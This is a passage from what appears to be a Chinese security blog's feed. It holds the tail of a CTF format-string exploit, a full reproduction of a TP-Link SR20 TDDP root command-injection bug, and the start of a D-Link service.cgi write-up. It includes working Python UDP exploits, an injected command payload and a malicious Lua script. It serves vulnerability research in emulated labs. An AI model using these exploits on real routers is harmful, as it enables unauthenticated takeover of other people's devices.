class="number">4</span>+<span class="number">2</span>+<span class="number">2</span>))-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((one_gadget&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xc4</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111644018.png" alt="image-20231211164419663"></p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>格式化字符串漏洞的题目做过很多了，从最初的多次栈上格式化字符串的任意泄露，再到多次任意写，再到劫持 <code>fini_array</code> <code>exit_hook</code> 等等的小 <code>trick</code> ，又发展到多次非栈上的格式化字符串漏洞利用，还能再上升到关闭输出流后的多次非栈上格式化字符串利用，最后上升到一次非栈上格式化字符串漏洞加 <code>exit</code> 直接退出的利用。这个过程似乎一直都在挑战有限条件内格式化字符串漏洞利用的极限，此时似乎我又对 <code>PWN</code> 产生了一些新的理解，从最开始对基础漏洞的好奇，到现在逐渐演变成了对漏洞利用极限的好奇，各路的 <code>PWN</code> 师傅们可能也都在探究各种漏洞所利用的极限。</p>
<p>唔，事情好像变的越来越有趣了🤔。不过目前略微遗憾的是没有太充裕的时间去详细分析 <code>printf</code> 函数源码来搞清这一切，暂时先鸽了🧐</p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>TP-Link SR20命令执行漏洞复现</title>
    <url>/posts/f87d120.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>针对 <code>TP-Link SR20</code> 做漏洞复现的时候，学习到了 <code>C</code> 程序调用 <code>lua</code> 文件所造成的命令执行漏洞，同时该路由器还存在一个命令注入的点。<code>TDDP</code> 是 <code>TP-LINK</code> 在 <code>UDP</code> 通信基础上设计的一种调试协议，当 <code>TP-Link SR20</code> 运行了 <code>V1</code> 版本的 <code>TDDP</code> 协议，在无需认证的情况下，往 <code>SR20</code> 设备的 <code>UDP 1040</code> 端口发送特定数据就可以造成命令注入漏洞或利用 <code>TFTP</code> 服务下载指定 <code>LUA</code> 文件并以 <code>root</code> 权限将其执行。还好这个协议的逆向量挺小的 😶‍🌫️</p>
<span id="more"></span>

<h2 id="从接收数据开始"><a href="#从接收数据开始" class="headerlink" title="从接收数据开始"></a>从接收数据开始</h2><p>用 <code>qemu</code> 用户级仿真情况如下，该进程会一直处于阻塞状态，猜测是由 <code>select</code> 函数造成的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311241543842.png" alt="image-20231124154303704"></p>
<p>执行命令 <code>sudo chroot . ./qemu-arm-static -g 1234 ./usr/bin/tddp</code> ，用 <code>gdb-multiarch</code> 进行调试，发现断点下到 <code>select</code> 是可以直接 <code>c</code> 过来的</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311241558221.png" alt="image-20231124155827058" style="zoom: 67%;" />



<p>但是把断点下到 <code>select</code> 函数执行后，就发现是处于了阻塞状态（猜测 <code>select</code> 监视了某个文件一直没有读到数据）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311241602275.png" alt="image-20231124160214927"></p>
<p>再看 <code>select</code> 函数上面的代码，发现是有进行初始化操作的部分。在 <code>v6[9]</code> 存放的是 <code>socket</code> 函数创建完的套接字（<code>sub_16E5c</code> 函数中实现的）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311241635915.png" alt="image-20231124163540849" style="zoom: 67%;" />



<p>分析一下 <code>sub_16D68</code> 函数，它的第一个形参是刚刚创建的套接字，第二个形参是 <code>1040</code> </p>
<p>通过下面的代码能分析出 <code>bind</code> 函数将套接字与 <code>0.0.0.0:1040</code> 这个地址和端口所绑定的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311241639182.png" alt="image-20231124163902135"></p>
<p>此时在主机上运行程序 <code>tddp</code> 后，虽然是阻塞状态，但可以发现 <code>1040</code> 端口已经被监听</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311241653585.png" alt="image-20231124165320433"></p>
<p>这里的 <code>v6[9]</code> 是 <code>socket </code> 函数返回的文件描述符为 <code>5</code> （找了半天也没看到文件描述符 <code>4</code> 是哪个文件）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">timeout.tv_sec = <span class="number">600</span>;</span><br><span class="line">timeout.tv_usec = <span class="number">0</span>;</span><br><span class="line">readfds.__fds_bits[v6[<span class="number">9</span>] &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; (v6[<span class="number">9</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">v7 = select(nfds, &amp;readfds, <span class="number">0</span>, <span class="number">0</span>, &amp;timeout);</span><br></pre></td></tr></table></figure>

<p>下面要分析的核心是 <code>readfds.__fds_bits[v6[9] &gt;&gt; 5] |= 1 &lt;&lt; (v6[9] &amp; 0x1F)</code> 这行代码，这个 <code>readfds</code> 里存放的是要检查可读文件描述符的集合。它是用每个 <code>bit</code> 来表示一个文件描述符，因为比特图 <code>__fds_bit</code> 的每个元素的类型都为 <code> unsigned long</code> ，其大小为 <code>4</code> 字节 <code>32</code> 位 <code>bit</code> ，所以理论上 <code>_fds_bit</code> 的每个图都可以表示 <code>32</code> 个文件描述符的状态。其 <code>bit</code> 为 <code>1</code> 就表示该文件描述符要检查，为 <code>0</code> 则表示不检查。</p>
<p>再来看这行代码 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readfds.__fds_bits[v6[<span class="number">9</span>] &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; (v6[<span class="number">9</span>] &amp; <span class="number">0x1F</span>)</span><br></pre></td></tr></table></figure>

<p><code>v6[9]</code> 表示的是 <code>socket</code> 返回的那个文件描述符 <code>5</code>，让这个文件描述符右移 <code>5</code> ，也就是除以 <code>32</code> ，拿到的是该文件描述符位于第几个图。<code>5/32</code> 为 <code>0</code> ，这表示它位于第一个图。再看右边的 <code>1 &lt;&lt; (v6[9] &amp; 0x1F)</code> 这个 <code>v6[9] &amp; 0x1F</code> 部分，<code>0x1F</code> 的二进制为 <code>11111</code> ，用目标文件描述符和其进行与运算（这是为了避免文件描述符超过了一个图能表示的范围，算比特位属于哪个图由 <code>__fds_bits[v6[9] &gt;&gt; 5]</code> 来做，计算位于具体某个图的哪个比特位由 <code>1 &lt;&lt; (v6[9] &amp; 0x1F)</code> 来做 ），最后用 <code>|</code> 将图中的唯一比特位写入具体的一个图中。这里即使不理解也并不影响后面的分析，它就是把文件描述符 <code>5</code> 用 <code>select</code> 函数进行了是否可读的监视。设置的超时时间为 <code>600</code> 秒。</p>
<p>此时 <code>socket</code> 创建的套接字已经和 <code>ip port</code> 所绑定，只要向目标地址发送数据，就可以让 <code>select</code> 监视的可读文件描述符检测到有数据，从阻塞转到就绪，继续往下运行。执行到 <code>sub_16418</code> ，其调用了 <code>recvfrom</code> 函数，接收了发送给 <code>1040</code> 端口的数据包。</p>
<p>看下 <code>recvfrom</code> 函数执行前后，将远端发送的数据读入内存的过程</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311261403838.png" alt="image-20231126140348484"></p>
<p>此时的 <code>exp</code> 如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s_send = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;aaaaaaaaaaaa&#x27;</span></span><br><span class="line">s_send.sendto(payload, (<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1040</span>))</span><br><span class="line">s_send.close()</span><br></pre></td></tr></table></figure>



<p>代码里存放数据包的首地址也就是 <code>a1+45083</code> ，接下来就追踪这个数据，看看是否会存在漏洞。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311261418722.png" alt="image-20231126141853635" style="zoom:50%;" />



<p>根据功能码执行相应操作是在 <code>handle</code> 函数（已经过重命名），第一个 <code>if</code> 判断的是数据包的版本号，只要第一个字节是 <code>1</code> 就行。<code>sub_15AD8</code> 函数判断的是 <code>*a1</code> 是否为空，它在前面的函数中已经将其赋值为堆地址，所以也能正常通过第二个 <code>if</code> 的检查</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311261430639.png" alt="image-20231126143002573" style="zoom:50%;" />



<p><code>handle</code> 函数是用来执行数据包中各功能码对应的功能，<code>switch case</code> 语句处理的就是功能码对应的操作，红框中写的是 <code>*(a1+45084)</code> ，这说明数据包的第二字节代表功能码。漏洞位于 <code>0x31</code>  功能码对应的函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311261829172.png" alt="image-20231126182933017" style="zoom:50%;" />



<h2 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h2><h3 id="sub-A580"><a href="#sub-A580" class="headerlink" title="sub_A580"></a>sub_A580</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311240843060.png" alt="image-20231124084353714" style="zoom: 33%;" />

<p>结合上图可知，<code>v12</code> 取了 <code>tddp</code> 数据包的首地址。然后在 <code>if(*v12 == 1)</code> 判断了数据包第一个字节（也就是 <code>tddp</code> 协议的版本号）是否为 <code>Version1</code> ，如果是，则让指针 <code>v18</code> 移动 <code>12</code> 个字节，反之移动 <code>28</code> 个字节。</p>
<p>在移动后的位置用 <code>sscanf(v18, &quot;%[^;];%s&quot;, s, v9)</code> 函数对其进行 <code>;</code> 分割，字符串中 <code>;</code> 前面的部分放入 <code>s</code> 中，<code>;</code> 后面的部分放入 <code>v9</code> 中，随后触发 <code>DIY_system</code> 函数（已被重命名）</p>
<h3 id="DIY-system"><a href="#DIY-system" class="headerlink" title="DIY_system"></a>DIY_system</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311261854627.png" alt="image-20231126185450551" style="zoom:50%;" />

<p>查看变量定义的位置，猜测 <code>argv</code> <code>v4</code> <code>v5</code> <code>v6</code> 应该是一个指针数组，<code>execve</code> 函数的第二个参数就是指针数组（是 <code>execve</code> 执行程序的命令行参数），这里实际上为 <code>execve(&quot;/bin/sh&quot;,&quot;sh -c xxx&quot;,0)</code> 这个 <code>xxx</code> 也就是变量 <code>s</code> ，<code>s</code> 由 <code>vsprintf</code> 函数拼接而成，原始的数据为 <code>sub_A580</code> 函数中调用 <code>sub_91DC(&quot;cd /tmp;tftp -gr %s %s &amp;&quot;, s, v15)</code> 进行传递的，此处我将 <code>sub_91dc</code> 函数重命名为了 <code>DIY_system</code> 函数</p>
<blockquote>
<p>结论：控制 <code>tddp</code> 协议的版本号为 <code>Version1</code> ，功能码为 <code>0x31</code> ，在功能码后面填充 <code>10</code> 个垃圾字符，然后输入任意命令以 <code>;</code> 结尾。这里虽然无法使用命令分隔符 <code>;</code> ，但是 <code>&amp;&amp;</code> 和 <code>||</code> 并没有进行过滤，依然可以造成命令注入。</p>
</blockquote>
<p>我发现网上的相关资料都是直接用了 <code>qemu</code> 的系统级仿真，原本好奇为什么不先采用 <code>qemu</code> 的用户级仿真，为了方便我首先采用了 <code>sudo chroot . ./qemu-arm-static -g 1234 ./usr/bin/tddp</code> 的方式来进行调试程序。前面的流程都一切正常，但是会卡在 <code>sub_15110</code> 内的 <code>lua_pcall</code> 函数。不确定这是否因为用户级仿真单个程序所造成的原因，我采用的方法是用 <code>set</code> 命令改变了 <code>pc</code> 寄存器的值，跳过了一些可能造成干扰的函数，<code>sub_15458</code> 函数完成了刚开始的初始化操作后，直接将该函数返回（通过修改 <code>pc</code> 寄存器）。后续执行流就可以正常执行了 ，下图是正常走到 <code>DIY_system</code> 函数时各寄存器的状态</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311261952015.png" alt="image-20231126195202805" style="zoom: 67%;" />

<p>因为用户级仿真不支持多线程，所以后续在调用 <code>fork</code> 函数的时候，子进程是出不来的，导致没办法进入 <code>if ( !pid )</code> ，也就无法执行到 <code>execve</code> 函数。</p>
<h2 id="搭建系统级仿真"><a href="#搭建系统级仿真" class="headerlink" title="搭建系统级仿真"></a>搭建系统级仿真</h2><p>所以为了最终验证 <code>POC</code> ，还得用 <code>qemu</code> 搭建系统级仿真，先下载这三个文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure>

<p>下面是 <code>net.sh</code> 脚本和 <code>boot.sh</code> 脚本，先执行 <code>net.sh</code> 配置出一个 <code>qemu</code> 的网络接口 <code>tap0</code> ，然后再执行 <code>boot.sh</code> 脚本启动 <code>qemu</code> （大概要等待三分钟左右）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># 首先关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33                # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">  -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">  -append &quot;root=/dev/mmcblk0p2&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic -smp 4</span><br></pre></td></tr></table></figure>



<p>然后把解压出来的文件系统给传到 <code>qemu</code> 中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo scp squashfs-root.tar.gz  root@10.214.140.139:/root/</span><br></pre></td></tr></table></figure>

<p>再传一个 <code>gdbserver</code> 进去，方便调试。  <a href="https://github.com/stayliv3/gdb-static-cross/blob/master/prebuilt/gdbserver-7.7.1-armhf-eabi5-v1-sysv">gdbserver下载链接</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo scp gdbserver  root@10.214.140.139:/root/</span><br></pre></td></tr></table></figure>



<p>进到 <code>qemu</code> 里，用 <code>chroot</code> 在传入的文件系统里做一个隔离环境，就可以进行调试了</p>
<p>此时调试的过程就不再演示，上文提到 <code>sub_15110</code> 内的 <code>lua_pcall</code> 函数会造成用户级仿真的阻塞，在系统级仿真里面也没有出现问题了。</p>
<p>启动 <code>tddp</code> 服务后可以看到 <code>1040</code> 端口已经被监听（但是不知道为什么在宿主机用 <code>nmap</code> 扫描不出来）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311271715862.png" alt="image-20231127171524634"></p>
<h2 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h2><p>根据上文的分析，编写 <code>EXP</code> 如下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s_send = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x01\x31&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span></span><br><span class="line">payload+=<span class="string">b&#x27;||pwd&amp;&amp;id&amp;&amp;ls /||;xxx&#x27;</span></span><br><span class="line">s_send.sendto(payload, (<span class="string">&quot;10.214.140.139&quot;</span>,<span class="number">1040</span>))</span><br><span class="line">s_send.close()</span><br></pre></td></tr></table></figure>

<p>攻击效果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311271725664.png" alt="image-20231127172545362"></p>
<h2 id="利用lua文件命令执行"><a href="#利用lua文件命令执行" class="headerlink" title="利用lua文件命令执行"></a>利用lua文件命令执行</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311272228134.png" alt="image-20231127222858050"></p>
<p>上图中的 <code>v15</code> 为发送数据方 <code>IP</code> （经下图调试可知），所以正常 <code>DIY_system</code> 函数会利用 <code>tftp</code> 从对应机器上下载一个文件（用户可控），并且该文件在后面被当做 <code>lua</code> 文件进行加载执行（由 <code>lua_call</code> 函数完成），执行的是文件中的 <code>config_test</code> 函数。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311272244258.png" alt="image-20231127224456051" style="zoom:50%;" />



<p>只需要构造一个 <code>lua</code> 文件，命名一个 <code>config_test</code> 函数，里面自定义命令执行的代码即可。因为后面执行了两次 <code>lua_pushstring</code> 函数，这意味着正常的 <code>config_test</code> 函数应该有两个参数。</p>
<h2 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h2><p>所以编写恶意 <code>lua</code> 脚本如下</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(para1, para2)</span></span></span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(para1)</span><br><span class="line">    <span class="built_in">os</span>.<span class="built_in">execute</span>(para2)<span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>把 <code>exp</code> 改成这样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s_send = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x01\x31&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span></span><br><span class="line">payload+=<span class="string">b&#x27;demo.lua;xxx&#x27;</span></span><br><span class="line">s_send.sendto(payload, (<span class="string">&quot;10.214.140.139&quot;</span>,<span class="number">1040</span>))</span><br><span class="line">s_send.close()</span><br></pre></td></tr></table></figure>

<p>最终验证需要安装 <code>lua</code>  同时还得配置 <code>TFTP server</code> ，具体细节可以参考 <a href="https://cloud.tencent.com/developer/article/1987863">文章</a></p>
<p>攻击效果：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311280931186.png" alt="image-20231128093158056"></p>
<p>根据上图的信息可以发现是连续执行了三条命令，分别为 <code>id</code> <code>xxx</code> <code>10.214.140.177</code>。第一个命令 <code>id</code> 很明显是 <code>lua</code> 脚本里写死的，而 <code>xxx</code> 和后面的 <code>ip</code> ，其实是 <code>C</code> 代码传给 <code>lua</code> 脚本中 <code>config_test</code> 的参数。第三个命令是 <code>ip</code> 不可控，但第二个命令是以数据包中 <code>;</code> 为分隔符，后面的数据 <code>xxx</code> 依然可控，所以最终可以导致同时执行两个命令</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311280938211.png" alt="image-20231128093849142" style="zoom: 67%;" />





<h2 id="报错与解决"><a href="#报错与解决" class="headerlink" title="报错与解决"></a>报错与解决</h2><h3 id="binwalk-报错-No-such-file-or-directory-7z"><a href="#binwalk-报错-No-such-file-or-directory-7z" class="headerlink" title="binwalk 报错 No such file or directory: 7z"></a>binwalk 报错 No such file or directory: 7z</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311231959486.png" alt="image-20231123195903979"></p>
<p>发现是 <code>binwalk</code> 依赖了 <code>7z</code> ，所以还得装一个 <code>7z</code> 。</p>
<p>我首先执行的命令 <code>apt-get install p7zip</code>  ，执行完后发现用 <code>binwalk</code> 解压依然是同样的错误，执行 <code>which 7z</code> ，报错为 <code>7z not found</code> 。发现 <code>7z</code> 并没有被安装成功，经过一番搜索后应该安装 <code>p7zip-full</code> ，这样 <code>7z</code> 就被成功安装。 <code>binwalk</code> 正常执行</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311232006197.png" alt="image-20231123200612873"></p>
<h3 id="编译-C-程序报错"><a href="#编译-C-程序报错" class="headerlink" title="编译 C 程序报错"></a>编译 C 程序报错</h3><p><code>gcc -o call call.c -llua</code> 报错：缺少头文件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311272155328.png" alt="image-20231127215529226"></p>
<p>解决方法：加上 <code>-I</code> 参数，让编译器在指定目录下寻找头文件</p>
<p><code>gcc -o call call.c  -llua -I/home/zikh/Desktop/lua-5.3.5/src -llua</code> 报错：<code>ld</code> 无法找到 <code>-llua</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311272159502.png" alt="image-20231127215905441"></p>
<p>解决方法：在加 <code>-L</code> 参数，在指定目录下寻找库文件</p>
<p>最终命令为 <code>gcc -o call call.c  -llua -I/home/zikh/Desktop/lua-5.3.5/src -L/home/zikh/Desktop/lua-5.3.5/src -llua -lm -ldl</code></p>
<p>成功运行 <code>C</code> 语言编写的 <code>call</code> 调用 <code>lua</code> 程序  </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311272203022.png" alt="image-20231127220353877"></p>
<h3 id="tftp没有找到下载文件的目录"><a href="#tftp没有找到下载文件的目录" class="headerlink" title="tftp没有找到下载文件的目录"></a>tftp没有找到下载文件的目录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ # tftp -g -r /demo.lua 10.214.140.177</span><br><span class="line">tftp: server error: (1) File not found</span><br></pre></td></tr></table></figure>

<p>我按照网上资料，也将配置文件的目录修改到了 <code>/opt/ftp_dir</code> ，并且也给了 <code>777</code> 的权限，重启服务后，依然报了上面的错误。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311280902963.png" alt="image-20231128090253800"></p>
<p>解决方法：猜测上传文件的目录和下载文件的目录是同一个，我在宿主机上用 <code>tftp</code> 上传了一个 <code>1.txt</code> 文件，再用 <code>find</code> 进行搜索（如下图）发现上传的文件位于 <code>/srv/tftp</code> 目录下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311280912050.png" alt="image-20231128091222909"></p>
<p>从 <code>qemu</code> 里下载这个目录下的文件是成功的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311280928589.png" alt="image-20231128092817484"></p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>虽然文件系统里有自带的 <code>nc</code> ，但因为是简化版无法造成反弹的命令执行。<strong>winmt</strong> 师傅自己传入了一个完整版的 <code>nc</code> 进行了测试。命令执行的点到此结束了，因为我也不执着于这个反弹 <code>shell</code> ，就不再进行后续的操作了😶‍🌫️</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/backahasten/p/6119321.html#:~:text=TDDP%E6%98%AF%E4%B8%80%E4%B8%AA%E7%94%A8,%E6%88%96%E8%80%85%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BC%A0%E9%80%92%E3%80%82">我的翻译–一个针对TP-Link调试协议（TDDP）漏洞挖掘的故事 - backahasten - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/weixin_43815930/article/details/107601747">对TP-Link SR20 tddp协议漏洞的详细逆向研究_tddp 协议-CSDN博客</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1987863">TP Link SR20 ACE漏洞分析-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>命令注入</tag>
        <tag>ARM架构</tag>
        <tag>TP-Link</tag>
      </tags>
  </entry>
  <entry>
    <title>CNVD-2018-01084复现（D-Link DIR部分型号service.cgi命令执行）</title>
    <url>/posts/b6d416c3.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着 <strong>winmt</strong> 师傅的私房笔记做了一个 <code>D-Link</code> 的命令注入漏洞复现（ CNVD-2018-01084），由于前一段做了一个 <a href="https://zikh26.github.io/posts/5f982ad5.html#more">CVE-2018-7034复现–TrendNet路由器登录信息泄露 </a> ，那个固件当时进行了仔细分析，而这次的 <code>DIR-815</code> 和 <code>TrendNet</code> 里的 <code>cgibin</code> 几乎一致 ，因此只针对漏洞利用部分进行了详细分析。</p>
<span id="more"></span>

<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084">漏洞信息</a> </p>
<blockquote>
<p>D-Link DIR 615&#x2F;645&#x2F;815路由器1.03及之前的固件版本存在远程命令执行漏洞。该漏洞是由于service.cgi中拼接了HTTP POST请求中的数据，造成后台命令拼接，导致可执行任意命令。</p>
</blockquote>
<h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><p>根据漏洞描述来看，必须要寻找固件版本为 <code>1.03</code> 及之前的  <a href="https://ftp.dlink.ru/pub/Router/DIR-815/Firmware/RevA/">下载链接</a></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>在 <code>servicecgi_main</code> 函数中存在一个 <code>lxldbc_system</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151253546.png" alt="image-20231115125329494"></p>
<p>这里的 <code>va_start</code> 就是来接收传进来的可变参数，然后用 <code>vsnprintf</code> 函数解析字符串拼接成一个字符串，用 <code>system</code> 将其执行。</p>
<p>确定一下其参数是否可控，有的 <code>IDA</code> 里看到的可能是下图这种界面，这里其实 <code>IDA</code> 没显示完全</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311151322627.png" alt="image-20231115132207531" style="zoom: 67%;" />



